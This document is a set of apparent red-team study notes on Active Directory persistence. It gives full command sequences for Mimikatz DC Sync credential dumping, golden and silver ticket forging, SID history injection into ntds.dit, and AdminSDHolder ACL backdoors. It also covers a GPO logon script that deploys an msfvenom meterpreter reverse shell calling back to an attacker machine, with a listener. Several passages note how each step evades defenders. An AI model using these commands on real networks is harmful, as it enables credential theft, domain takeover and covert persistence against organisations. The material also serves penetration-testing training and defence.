# Tools

- `Mimikatz`
- `Invoke-ADSDPropagation`

# Persistence through Credentials

## Understanding different types of credentials

- **Credentials that have local administrator rights on several machines**. Usually, organisations have a group or two with local admin rights on almost all computers. These groups are typically divided into one for workstations and one for servers. By harvesting the credentials of members of these groups, we would still have access to most of the computers in the estate.
- **Service accounts that have elegation permissions**. With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.
- **Accounts used for privileged AD services**. If we compromise accounts of privileged services such as Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.

## Using DC Sync

It is not sufficient to have a single domain controller per domain in large organisations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. As such, these organisations make use of multiple DCs. The question then becomes, how is it possible for you to authenticate using the same credentials in two different offices.

Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information. This includes updated information such as the user's new password and new objects such as when a new user is created. This is why you usually have to wait a couple of minutes before you authenticate after you have changed your password since the DC where the password change occurred could perhaps not be the same one as the one where you are authenticating to.

A popular attack to perform is a DC Sync attack. If we have access to an account that has domain replication permissions, we can stage a DC Sync attack to harvest credentials from a DC.

We will use `Mimikatz` to harverst credentials:
Pre-requirement:

- ALready Compromised DC
- DC Admin

1. Perform DC Sync of a single account:

```PowerShell
mimikatz # lsadump::dcsync /domain:<DOMAIN_NAME> /user:<Your low-privilege AD Username>
```

2. DC sync every single account.

3. To do this, we will have to enable logging on Mimikatz:

```PowerShell
mimikatz # log <logdump>_dcdump.txt
```

4. Perform DC Sync for all account

```PowerShell
mimikatz # lsadump::dcsync /domain:<DOMAIN_NAME /all
```

5. Once complete grab all SAM Username and NTLM Hash

```cmd
cat <logdump>_dcdump.txt | grep "SAM Username"
```

```cmd
cat <logdump>_dcdump.txt | grep "Hash NTLM"
```

6. To search thorugh the logdump we can use various methods:

```cmd
# Inspect the file with the less command
# Use the arrow keys to navigate
# Search for a term by hitting the '/' key
less <FILENAME>.txt
```

# Persistence through Tickets

## Golden Tickets

Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. In order to forge a golden ticket, we need the KRBTGT account's password hash so that we can sign a TGT for any user account we want. Some interesting notes about Golden Tickets:

- The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
- Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a `disabled`, `deleted`, or `non-existent` account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes.
- By default, the KRBTGT account's password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever.
- The blue team would have to rotate the KRBTGT account's password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services.
- Rotating the KRBTGT account's password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to realize that the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
- Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.
- We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect.

Golden ticket requirements:

- KRBTGT Account's password hash
- Domain name
- Domain SID
- User SID of the person we want to impersonate

## Silver Tickets

Silver Tickets are forged TGS tickets and allow us to just interface with the service we want access to directly. Some interesting notes about Silver Tickets:

- The generated TGS is signed by the machine account of the host we are targeting.
- The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the KRBTGT account's password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket's scope is limited to whatever service is targeted on the specific server.
- Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.
- Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.
- The machine account's password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine.
- While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

Silver tickets requirements:

- NTLM hash associated with the SERVER_MACHINE
- Domain SID

## Generating Golden and Silver tickets

1. Perform DC Sync to obtain a hashdump
2. Get the Domain SID using PowerShell

```PowerShell
PS C:\Users\Administrator> Get-ADDomain
```

3. Launch Mimikatz to generate a golden ticket:

```PowerShell
mimikatz # kerberos::golden /admin:<ADMINISTRATOR> /domain:<DOMAIN_NAME /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```

Parameters explained:

- **/admin** - The username we want to impersonate. This does not have to be a valid user.
- **/domain** - The FQDN of the domain we want to generate the ticket for.
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/krbtgt** -The NTLM hash of the KRBTGT account.
- **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
- **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

4. Verify that the Golden Ticket is working using PowerShell:

```PowerShell
PS Administrator> dir \\<DOMAIN_NAME\c$\
```

5. Launch Mimikatz to generate a silver ticket:

```PowerShell
mimikatz # kerberos::golden /admin:<ADMINISTRATOR> /domain:<DOMAIN_NAME /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```

Parameters explained:

- **/admin** - The username we want to impersonate. This does not have to be a valid user.
- **/domain** - The FQDN of the domain we want to generate the ticket for.
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/target** - The hostname of our target server.
- **/rc4** - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of <Hostname of the server being targeted>$. The $ indicates that it is a machine account.
- **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

6.  Verify that the Silver Ticket is working using Powershell:

```PowerShell
PS Administrator> dir \\<DOMAIN_NAME\c$\
```

# Persistence through SID history

The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. In the new domain, the user would have a new SID, but we can add the user's existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence.

## Techniques for persistence through SID history

- We normally require Domain Admin privileges or the equivalent thereof to perform this attack.
- When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
- We can take this attack a step further if we inject the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.
- Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.

## Performing SID forging

1. Verify that the low-privilege user account does not already have information on their SID history:

```PowerShell
Get-ADUser <your ad username> -properties sidhistory,memberof
```

2. Obtain the SID of Doamin Admin group or any other group so that we can this to our compromised users SID:

```PowerShell
Get-ADGroup "Domain Admins"
```

\_Note: We can use Mimikatz but the latest version of Mimikatz has a flow which does not allow it to patch LSASS to update the SID history.

3. Use `DSInternals` to patch `ntds.dit` file. This is a database file where all information is stored.
   \_Note: You will need to run as Administrator since this technique requires services to be srated and stopped.

Stop the `ntds` service:

```PowerSHell
Stop-Service -Name ntds -force
```

Add the SID History to the low-privilege account:

```PowerShell
Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
```

Restart the `ntds` service:

```PowerShell
Start-Service -Name ntds
```

4. Verify that the SID History has been updated.
   SSH into the compromised account:

```
ssh <DOM\\<AD Username>@<WORKSTATION>.<DOMAIN>
```

Search for SID History attribute:

```PowerShell
Get-ADUser <username of our low-priveleged AD account> -Properties sidhistory
```

# Persistence through Group Membership

In most organisations, there are a significant amount of recursive groups. A recursive group is a group that is a member of another group. We can think of this as group nesting. Group nesting is used to create a more organised structure in AD.

This also becomes a monitoring problem. Let's say, for instance, we have an alert that fires off when a new member is added to the Domain Admins group. That is a good alert to have, but it won't fire off if a user is added to a subgroup within the Domain Admins group. This is a very common problem since AD is managed by the AD team, and alerting and monitoring are managed by the InfoSec team. All we need is a little bit of miscommunication, and the alert is no longer valid since subgroups are used.

As an attacker, we can leverage this reduced visibility to perform persistence. Instead of targeting the privileged groups that would provide us with access to the environment, we focus our attention on the subgroups instead. Rather than adding ourselves to a privileged group that would raise an alert, we add ourselves to a subgroup that is not being monitored.

Commands to add new member to a group:

```PowerShell
Add-ADGroupMember -Identity <group_name> -Members <low privileged username>
```

# Persistence through ACLs

## AdminSDHolder

One such template is the AdminSDHolder container. This container exists in every AD domain, and its Access Control List (ACL) is used as a template to copy permissions to all protected groups. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.

1. Once logged into the compromized machine as a low-privilege user use the `runas` command to opem `cmd`:

```cmd
runas /netonly /user:Administrator cmd.exe
```

2. Open MMC.
3. Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Groups). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:
4. Navigate to the Security of the group (Right-click->Properties->Security):
5. Let's add our low-privileged user and grant Full Control:

- Click Add.
- Search for your low-privileged username and click Check Names.
- Click OK.
- Click Allow on Full Control.
- Click Apply.
- Click OK.

## SDProp

A process called SDProp takes the ACL of the AdminSDHolder container and applies it to all protected groups every 60 minutes. We can thus write an ACE that will grant us full permissions on all protected groups. If the blue team is not aware that this type of persistence is being used, it will be quite frustrating. Every time they remove the inappropriate permission on the protected object or group, it reappears within the hour. Since this reconstruction occurs through normal AD processes, it would also not show any alert to the blue team, making it harder to pinpoint the source of the persistence.

To jump start the process manually use the following commands:

```PowerShell
PS C:\Tools> Import-Module .\Invoke-ADSDPropagation.ps1
PS C:\Tools> Invoke-ADSDPropagation
```

# Persistence through GPO

The following are some common GPO persistence techniques:

- **Restricted Group Membership** - This could allow us administrative access to all hosts in the domain
- **Logon Script Deployment** - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.

## Preparing the payload

1. Create our shell, listener, and the actual bat file that will execute our shell.

```cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ATTACK_MACHINE_IP> lport=4445 -f exe > shell.exe
```

2. Create a .bat script which will copy our executable to the host and execute it once the user authenticates.

```cmd
copy \\<DOMAIN_NAME>\sysvol\<DOMAIN_NAME>\scripts\shell.exe C:\tmp\shell.exe && timeout /t 20 && C:\tmp\shell.exe
```

3. Use SCP to copy both the payloads to the compromized machine.
4. Start the metasploit listener:

```cmd
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <ATTACKER_MACHINE_IP>; set LPORT 4445;exploit"
```

## Creating the GPO

1. The first step uses our Domain Admin account to open the Group Policy Management snap-in:

- In your runas-spawned terminal, type MMC and press enter.
- Click on File->Add/Remove Snap-in...
- Select the Group Policy Management snap-in and click Add
- Click OK

2. Apply the GPO to run on all Admins (you can select whichever gorup you want)
3. Right-click on the `Admins OU` and select `Create a GPO` in this domain, and Link it here.
4. Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes.
5. Right-click on your policy and select edit:

- Under User Configuration, expand **Policies->Windows Settings**.
- Select Scripts **(Logon/Logoff)**.
- Right-click on **Logon->Properties**
- Select the **Scripts** tab.
- Click **Add->Browse**.

6. Everytime an admin logs into the machine, we will get a call back.
